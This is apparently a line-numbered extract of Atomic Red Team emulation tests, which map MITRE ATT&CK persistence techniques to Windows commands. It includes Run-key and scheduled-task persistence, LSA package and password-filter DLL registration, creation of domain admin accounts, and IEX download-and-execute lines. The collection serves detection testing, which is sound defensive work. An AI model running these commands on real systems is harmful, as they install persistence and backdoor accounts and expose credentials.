4457: [- name: New shim database files created in the default shim database directory] [attack_technique: T1546.011] [      Copy-Item $PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb]
4458: [- name: New shim database files created in the default shim database directory] [attack_technique: T1546.011] [      Copy-Item $PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb]
4464: [- name: Registry key creation and/or modification events for SDB] [attack_technique: T1546.011] [    command: |]
4465: [- name: Registry key creation and/or modification events for SDB] [attack_technique: T1546.011] [      New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1546.011" -Value "AtomicRedTeamT1546.011"]
4466: [- name: Registry key creation and/or modification events for SDB] [attack_technique: T1546.011] [      New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1546.011" -Value "AtomicRedTeamT1546.011"]
4472: [- name: Authentication Package] [attack_technique: T1547.002] [    command: |]
4473: [- name: Authentication Package] [attack_technique: T1547.002] [      Copy-Item $PathToAtomicsFolder\T1547.002\bin\package.dll C:\Windows\System32\]
4474: [- name: Authentication Package] [attack_technique: T1547.002] [      reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0\0package.dll" /f]
4480: [- name: Bitsadmin Download (cmd)] [attack_technique: T1197] [    command: |]
4481: [- name: Bitsadmin Download (cmd)] [attack_technique: T1197] [      bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}]
4486: [- name: Bitsadmin Download (PowerShell)] [attack_technique: T1197] [    command: |]
4487: [- name: Bitsadmin Download (PowerShell)] [attack_technique: T1197] [      Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}]
4492: [- name: Persist, Download, & Execute] [attack_technique: T1197] [    command: |]
4493: [- name: Persist, Download, & Execute] [attack_technique: T1197] [      bitsadmin.exe /create #{bits_job_name}]
4494: [- name: Persist, Download, & Execute] [attack_technique: T1197] [      bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}]
4495: [- name: Persist, Download, & Execute] [attack_technique: T1197] [      bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL]
4496: [- name: Persist, Download, & Execute] [attack_technique: T1197] [      bitsadmin.exe /resume #{bits_job_name}]
4497: [- name: Persist, Download, & Execute] [attack_technique: T1197] [      ping -n 5 127.0.0.1 >nul 2>&1]
4498: [- name: Persist, Download, & Execute] [attack_technique: T1197] [      bitsadmin.exe /complete #{bits_job_name}]
4503: [- name: Bits download using desktopimgdownldr.exe (cmd)] [attack_technique: T1197] [    command: |]
4504: [- name: Bits download using desktopimgdownldr.exe (cmd)] [attack_technique: T1197] [      set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr]
4509: [- name: Add a driver] [attack_technique: T1547] [    command: |]
4510: [- name: Add a driver] [attack_technique: T1547] [      pnputil.exe /add-driver "#{driver_inf}"]
4513: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [    command: |]
4514: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}" -ForegroundColor Cyan]
4515: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      New-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32" -Value #{file_name} -Force | Out-Null]
4516: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null]
4517: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null]
4518: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null]
4519: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      Write-Host "executing eventvwr.msc" -ForegroundColor Cyan]
4520: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      START MMC.EXE EVENTVWR.MSC]
4528: [- name: System Scope COR_PROFILER] [attack_technique: T1574.012] [    command: |]
4529: [- name: System Scope COR_PROFILER] [attack_technique: T1574.012] [      Write-Host "Creating system environment variables" -ForegroundColor Cyan]
4530: [- name: System Scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null]
4531: [- name: System Scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null]
4532: [- name: System Scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null]
4539: [- name: Registry-free process scope COR_PROFILER] [attack_technique: T1574.012] [    command: |]
4540: [- name: Registry-free process scope COR_PROFILER] [attack_technique: T1574.012] [      $env:COR_ENABLE_PROFILING = 1]
4541: [- name: Registry-free process scope COR_PROFILER] [attack_technique: T1574.012] [      $env:COR_PROFILER = '#{clsid_guid}']
4542: [- name: Registry-free process scope COR_PROFILER] [attack_technique: T1574.012] [      $env:COR_PROFILER_PATH = '#{file_name}']
4543: [- name: Registry-free process scope COR_PROFILER] [attack_technique: T1574.012] [      POWERSHELL -c 'Start-Sleep 1']
4550: [- name: Change Default File Association] [attack_technique: T1546.001] [    command: |]
4551: [- name: Change Default File Association] [attack_technique: T1546.001] [      assoc #{extension_to_change}=#{target_extension_handler}]
4566: [- name: Powershell Execute COM Object] [attack_technique: T1546.015] [    command: |]
4567: [- name: Powershell Execute COM Object] [attack_technique: T1546.015] [      $o= [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39"))]
4568: [- name: Powershell Execute COM Object] [attack_technique: T1546.015] [      $item = $o.Item()]
4569: [- name: Powershell Execute COM Object] [attack_technique: T1546.015] [      $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)]
4574: [- name: DLL Search Order Hijacking - amsi.dll] [attack_technique: T1574.001] [    command: |]
4575: [- name: DLL Search Order Hijacking - amsi.dll] [attack_technique: T1574.001] [      copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe]
4576: [- name: DLL Search Order Hijacking - amsi.dll] [attack_technique: T1574.001] [      copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll]
4577: [- name: DLL Search Order Hijacking - amsi.dll] [attack_technique: T1574.001] [      %APPDATA%\updater.exe -Command exit]
4583: [- name: DLL Side-Loading using the Notepad++ GUP.exe binary] [attack_technique: T1574.002] [    command: |]
4584: [- name: DLL Side-Loading using the Notepad++ GUP.exe binary] [attack_technique: T1574.002] [      #{gup_executable}]
4605: [- name: Activate Guest Account] [attack_technique: T1078.001] [    command: |]
4606: [- name: Activate Guest Account] [attack_technique: T1078.001] [     net user #{guest_user} /active:yes]
4611: [- name: Create a new Windows domain admin user] [attack_technique: T1136.002] [    command: |]
4612: [- name: Create a new Windows domain admin user] [attack_technique: T1136.002] [      net user "#{username}" "#{password}" /add /domain]
4613: [- name: Create a new Windows domain admin user] [attack_technique: T1136.002] [      net group "#{group}" "#{username}" /add /domain]
4618: [- name: Create a new account similar to ANONYMOUS LOGON] [attack_technique: T1136.002] [    command: |]
4619: [- name: Create a new account similar to ANONYMOUS LOGON] [attack_technique: T1136.002] [      net user "#{username}" "#{password}" /add /domain]
4624: [- name: Create a new Domain Account using PowerShell] [attack_technique: T1136.002] [    command: |]
4625: [- name: Create a new Domain Account using PowerShell] [attack_technique: T1136.002] [      $SamAccountName = '#{username}']
4626: [- name: Create a new Domain Account using PowerShell] [attack_technique: T1136.002] [      $AccountPassword = ConvertTo-SecureString '#{password}' -AsPlainText -Force]
4627: [- name: Create a new Domain Account using PowerShell] [attack_technique: T1136.002] [      Add-Type -AssemblyName System.DirectoryServices.AccountManagement]
4628: [- name: Create a new Domain Account using PowerShell] [attack_technique: T1136.002] [      $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)]
4629: [- name: Create a new Domain Account using PowerShell] [attack_technique: T1136.002] [      $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)]
4630: [- name: Create a new Domain Account using PowerShell] [attack_technique: T1136.002] [      $User.SamAccountName = $SamAccountName]
4631: [- name: Create a new Domain Account using PowerShell] [attack_technique: T1136.002] [      $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)]
4632: [- name: Create a new Domain Account using PowerShell] [attack_technique: T1136.002] [      $User.SetPassword($TempCred.GetNetworkCredential().Password)]
4633: [- name: Create a new Domain Account using PowerShell] [attack_technique: T1136.002] [      $User.Enabled = $True]
4634: [- name: Create a new Domain Account using PowerShell] [attack_technique: T1136.002] [      $User.PasswordNotRequired = $False]
4635: [- name: Create a new Domain Account using PowerShell] [attack_technique: T1136.002] [      $User.DisplayName = $SamAccountName]
4636: [- name: Create a new Domain Account using PowerShell] [attack_technique: T1136.002] [      $User.Save()]
4637: [- name: Create a new Domain Account using PowerShell] [attack_technique: T1136.002] [      $User]
4642: [- name: IFEO Add Debugger] [attack_technique: T1546.012] [    command: |]
4643: [- name: IFEO Add Debugger] [attack_technique: T1546.012] [      REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"]
4648: [- name: IFEO Global Flags] [attack_technique: T1546.012] [    command: |]
4649: [- name: IFEO Global Flags] [attack_technique: T1546.012] [      REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512]
4650: [- name: IFEO Global Flags] [attack_technique: T1546.012] [      REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1]
4651: [- name: IFEO Global Flags] [attack_technique: T1546.012] [      REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "#{payload_binary}"]
4658: [- name: Create a new user in a command prompt] [attack_technique: T1136.001] [    command: |]
4659: [- name: Create a new user in a command prompt] [attack_technique: T1136.001] [      net user /add "#{username}" "#{password}"]
4664: [- name: Create a new user in PowerShell] [attack_technique: T1136.001] [    command: |]
4665: [- name: Create a new user in PowerShell] [attack_technique: T1136.001] [      New-LocalUser -Name "#{username}" -NoPassword]
4670: [- name: Create a new Windows admin user] [attack_technique: T1136.001] [    command: |]
4671: [- name: Create a new Windows admin user] [attack_technique: T1136.001] [      net user /add "#{username}" "#{password}"]
4672: [- name: Create a new Windows admin user] [attack_technique: T1136.001] [      net localgroup administrators "#{username}" /add]
4698: [- name: Netsh Helper DLL Registration] [attack_technique: T1546.007] [    command: |]
4699: [- name: Netsh Helper DLL Registration] [attack_technique: T1546.007] [      netsh.exe add helper #{helper_file}]
4702: [- name: Office Application Startup - Outlook as a C2] [attack_technique: T1137] [    command: |]
4703: [- name: Office Application Startup - Outlook as a C2] [attack_technique: T1137] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level" /t REG_DWORD /d 1 /f]
4704: [- name: Office Application Startup - Outlook as a C2] [attack_technique: T1137] [      mkdir  %APPDATA%\Microsoft\Outlook\ >nul 2>&1]
4705: [- name: Office Application Startup - Outlook as a C2] [attack_technique: T1137] [      echo "Atomic Red Team TEST" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM]
4711: [- name: Office Application Startup Test Persistence] [attack_technique: T1137.002] [    command: |]
4712: [- name: Office Application Startup Test Persistence] [attack_technique: T1137.002] [      reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d "#{thing_to_execute}"]
4717: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [    command: |]
4718: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      $passwordFilterName = (Copy-Item "#{input_dll}" -Destination "C:\Windows\System32" -PassThru).basename]
4719: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"]
4720: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      $notificationPackagesValues = $lsaKey.GetValue("Notification Packages")]
4721: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      $notificationPackagesValues += $passwordFilterName]
4722: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues]
4723: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      Restart-Computer -Confirm]
4726: [- name: Execution of program.exe as service with unquoted service path] [attack_technique: T1574.009] [    command: |]
4727: [- name: Execution of program.exe as service with unquoted service path] [attack_technique: T1574.009] [      copy #{service_executable} "C:\Program Files\windows_service.exe"]
4728: [- name: Execution of program.exe as service with unquoted service path] [attack_technique: T1574.009] [      copy #{service_executable} "C:\program.exe"]
4729: [- name: Execution of program.exe as service with unquoted service path] [attack_technique: T1574.009] [      sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto]
4730: [- name: Execution of program.exe as service with unquoted service path] [attack_technique: T1574.009] [      sc start "Example Service"]
4739: [- name: Add Port Monitor persistence in Registry] [attack_technique: T1547.010] [    command: |]
4740: [- name: Add Port Monitor persistence in Registry] [attack_technique: T1547.010] [      reg add "hklm\system\currentcontrolset\control\print\monitors\ART" /v "Atomic Red Team" /d "#{monitor_dll}" /t REG_SZ]
4745: [- name: Append malicious start-process cmdlet] [attack_technique: T1546.013] [    command: |]
4746: [- name: Append malicious start-process cmdlet] [attack_technique: T1546.013] [      Add-Content #{ps_profile} -Value ""]
4747: [- name: Append malicious start-process cmdlet] [attack_technique: T1546.013] [      Add-Content #{ps_profile} -Value "Start-Process #{exe_path}"]
4748: [- name: Append malicious start-process cmdlet] [attack_technique: T1546.013] [      powershell -Command exit]
4754: [- name: Reg Key Run] [attack_technique: T1547.001] [    command: |]
4755: [- name: Reg Key Run] [attack_technique: T1547.001] [      REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"]
4760: [- name: Reg Key RunOnce] [attack_technique: T1547.001] [    command: |]
4761: [- name: Reg Key RunOnce] [attack_technique: T1547.001] [      REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"]
4766: [- name: PowerShell Registry RunOnce] [attack_technique: T1547.001] [    command: |]
4767: [- name: PowerShell Registry RunOnce] [attack_technique: T1547.001] [      $RunOnceKey = "#{reg_key_path}"]
4768: [- name: PowerShell Registry RunOnce] [attack_technique: T1547.001] [      set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`")"']
4773: [- name: Suspicious vbs file run from startup Folder] [attack_technique: T1547.001] [    command: |]
4774: [- name: Suspicious vbs file run from startup Folder] [attack_technique: T1547.001] [      Copy-Item $PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"]
4775: [- name: Suspicious vbs file run from startup Folder] [attack_technique: T1547.001] [      Copy-Item $PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"]
4776: [- name: Suspicious vbs file run from startup Folder] [attack_technique: T1547.001] [      cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"]
4777: [- name: Suspicious vbs file run from startup Folder] [attack_technique: T1547.001] [      cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"]
4783: [- name: Suspicious jse file run from startup Folder] [attack_technique: T1547.001] [    command: |]
4784: [- name: Suspicious jse file run from startup Folder] [attack_technique: T1547.001] [      Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"]
4785: [- name: Suspicious jse file run from startup Folder] [attack_technique: T1547.001] [      Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"]
4786: [- name: Suspicious jse file run from startup Folder] [attack_technique: T1547.001] [      cscript.exe /E:Jscript "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"]
4787: [- name: Suspicious jse file run from startup Folder] [attack_technique: T1547.001] [      cscript.exe /E:Jscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"]
4793: [- name: Suspicious bat file run from startup Folder] [attack_technique: T1547.001] [    command: |]
4794: [- name: Suspicious bat file run from startup Folder] [attack_technique: T1547.001] [      Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"]
4795: [- name: Suspicious bat file run from startup Folder] [attack_technique: T1547.001] [      Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"]
4796: [- name: Suspicious bat file run from startup Folder] [attack_technique: T1547.001] [      Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"]
4797: [- name: Suspicious bat file run from startup Folder] [attack_technique: T1547.001] [      Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"]
4813: [- name: SystemBC Malware-as-a-Service Registry] [attack_technique: T1547.001] [    command: |]
4814: [- name: SystemBC Malware-as-a-Service Registry] [attack_technique: T1547.001] [      $RunKey = "#{reg_key_path}"]
4815: [- name: SystemBC Malware-as-a-Service Registry] [attack_technique: T1547.001] [      Set-ItemProperty -Path $RunKey -Name "socks5_powershell" -Value "#{reg_key_value}"]
4820: [- name: Scheduled Task Startup Script] [attack_technique: T1053.005] [    command: |]
4821: [- name: Scheduled Task Startup Script] [attack_technique: T1053.005] [      schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"]
4822: [- name: Scheduled Task Startup Script] [attack_technique: T1053.005] [      schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"]
4828: [- name: Scheduled task Remote] [attack_technique: T1053.005] [    command: |]
4829: [- name: Scheduled task Remote] [attack_technique: T1053.005] [      SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}]
4857: [- name: Powershell Cmdlet Scheduled Task] [attack_technique: T1053.005] [    command: |]
4858: [- name: Powershell Cmdlet Scheduled Task] [attack_technique: T1053.005] [      SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}]
4866: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [    command: |]
4867: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      $Action = New-ScheduledTaskAction -Execute "calc.exe"]
4868: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      $Trigger = New-ScheduledTaskTrigger -AtLogon]
4869: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest]
4870: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      $Set = New-ScheduledTaskSettingsSet]
4871: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set]
4872: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      Register-ScheduledTask AtomicTask -InputObject $object]
4895: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [    command: |]
4896: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
4897: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) ]
4898: [- name: Task Scheduler via VBA] [attack_technique: T1053.005] [      Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt" -officeProduct "#{ms_product}" -sub "Scheduler"]
4901: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [    command: |]
4902: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [      $xml = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml")]
4903: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [      Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }]
4919: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [    command: |]
4920: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [      reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f]
4921: [- name: Scheduled Task Executing Base64 Encoded Commands From Registry] [attack_technique: T1053.005] [      schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st #{time}]
4927: [- name: Set Arbitrary Binary as Screensaver] [attack_technique: T1546.002] [    command: |]
4928: [- name: Set Arbitrary Binary as Screensaver] [attack_technique: T1546.002] [      copy #{input_binary} "%SystemRoot%\System32\evilscreensaver.scr"]
4929: [- name: Set Arbitrary Binary as Screensaver] [attack_technique: T1546.002] [      reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f]
4930: [- name: Set Arbitrary Binary as Screensaver] [attack_technique: T1546.002] [      reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f]
4931: [- name: Set Arbitrary Binary as Screensaver] [attack_technique: T1546.002] [      reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f]
4932: [- name: Set Arbitrary Binary as Screensaver] [attack_technique: T1546.002] [      reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f]
4933: [- name: Set Arbitrary Binary as Screensaver] [attack_technique: T1546.002] [      shutdown /r /t 0]
4936: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] [    command: |]
4937: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] [      # run these in sequence]
4938: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] [      $SecurityPackages = Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages']
4939: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] [      $SecurityPackagesUpdated = $SecurityPackages]
4940: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] [      $SecurityPackagesUpdated += "#{fake_ssp_dll}"]
4941: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] [      Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated]
4942: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] []
4943: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] [      # revert (before reboot)]
4944: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] [      Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackages]
4947: [- name: Service Registry Permissions Weakness] [attack_technique: T1574.011] [    command: |]
4948: [- name: Service Registry Permissions Weakness] [attack_technique: T1574.011] [      get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL]
4949: [- name: Service Registry Permissions Weakness] [attack_technique: T1574.011] [      get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL]
4952: [- name: Service ImagePath Change with reg.exe] [attack_technique: T1574.011] [    command: |]
4953: [- name: Service ImagePath Change with reg.exe] [attack_technique: T1574.011] [      reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}" /f /v ImagePath /d "#{malicious_service_path}"]
4958: [- name: Shortcut Modification] [attack_technique: T1547.009] [    command: |]
4959: [- name: Shortcut Modification] [attack_technique: T1547.009] [      echo [InternetShortcut] > #{shortcut_file_path}]
4960: [- name: Shortcut Modification] [attack_technique: T1547.009] [      echo URL=C:\windows\system32\calc.exe >> #{shortcut_file_path}]
4961: [- name: Shortcut Modification] [attack_technique: T1547.009] [      #{shortcut_file_path}]
4966: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [    command: |]
4967: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $Shell = New-Object -ComObject ("WScript.Shell")]
4968: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut = $Shell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk")]
4969: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.TargetPath="cmd.exe"]
4970: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.WorkingDirectory = "C:\Windows\System32";]
4971: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.WindowStyle = 1;]
4972: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.Description = "T1547.009.";]
4973: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.Save()]
4974: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] []
4975: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $Shell = New-Object -ComObject ("WScript.Shell")]
4976: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut = $Shell.CreateShortcut("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk")]
4977: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.TargetPath="cmd.exe"]
4978: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.WorkingDirectory = "C:\Windows\System32";]
4979: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.WindowStyle = 1;]
4980: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.Description = "T1547.009.";]
4981: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.Save()]
4987: [- name: Install MS Exchange Transport Agent Persistence] [attack_technique: T1505.002] [    command: |]
4988: [- name: Install MS Exchange Transport Agent Persistence] [attack_technique: T1505.002] [      Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}]
4989: [- name: Install MS Exchange Transport Agent Persistence] [attack_technique: T1505.002] [      Enable-TransportAgent #{transport_agent_identity}]
4990: [- name: Install MS Exchange Transport Agent Persistence] [attack_technique: T1505.002] [      Get-TransportAgent | Format-List Name,Enabled]
4999: [- name: Web Shell Written to Disk] [attack_technique: T1505.003] [    command: |]
5000: [- name: Web Shell Written to Disk] [attack_technique: T1505.003] [      xcopy /I /Y #{web_shells} #{web_shell_path}]
5007: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [    command: |]
5008: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';]
5009: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [                      EventNameSpace='root\CimV2';]
5010: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [                      QueryLanguage="WQL";]
